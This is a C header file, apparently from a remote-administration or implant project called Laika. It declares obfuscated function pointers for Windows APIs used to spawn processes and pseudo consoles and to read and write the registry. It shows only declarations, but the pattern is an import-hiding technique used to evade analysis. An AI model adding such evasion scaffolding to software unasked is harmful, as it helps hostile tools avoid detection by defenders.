#ifndef LAIKA_OBF_H
#define LAIKA_OBF_H

#include "laika.h"

#ifdef _WIN32
#    include <process.h>
#    include <windows.h>

/* WINAPI types */
typedef HINSTANCE(WINAPI *_ShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef HRESULT(WINAPI *_CreatePseudoConsole)(COORD, HANDLE, HANDLE, DWORD, HPCON *);
typedef void(WINAPI *_ClosePseudoConsole)(HPCON);
typedef BOOL(WINAPI *_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef LSTATUS(WINAPI *_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LSTATUS(WINAPI *_RegCloseKey)(HKEY);
typedef LSTATUS(WINAPI *_RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD);
typedef LSTATUS(WINAPI *_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);

extern _ShellExecuteA oShellExecuteA;
extern _CreatePseudoConsole oCreatePseudoConsole;
extern _ClosePseudoConsole oClosePseudoConsole;
extern _CreateProcessA oCreateProcessA;
extern _RegOpenKeyExA oRegOpenKeyExA;
extern _RegCloseKey oRegCloseKey;
extern _RegSetValueExA oRegSetValueExA;
extern _RegQueryValueExA oRegQueryValueExA;
#endif

void laikaO_init();

#endif